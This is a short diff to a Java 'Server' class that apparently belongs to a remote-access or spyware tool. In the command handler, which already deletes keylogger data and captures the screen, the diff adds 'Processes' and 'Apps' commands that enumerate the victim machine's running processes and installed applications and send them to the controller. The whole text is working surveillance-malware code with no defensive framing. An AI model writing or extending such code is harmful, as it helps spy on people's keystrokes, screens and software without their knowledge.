@@ -83,6 +83,10 @@ public class Server {
                     keyLogger.Delete();
                 } else if (cmdString.equalsIgnoreCase("CaptureScreen")) {
                     SendData("CaptureScreen", ScreenCapture.Capture());
+                } else if (cmdString.equalsIgnoreCase("Processes")) {
+                    SendData("Processes", ProccessController.GetProccess());
+                } else if (cmdString.equalsIgnoreCase("Apps")) {
+                    SendData("Apps", ProccessController.GetApps());
                 } else {
                     SendCommand("None");
                 }
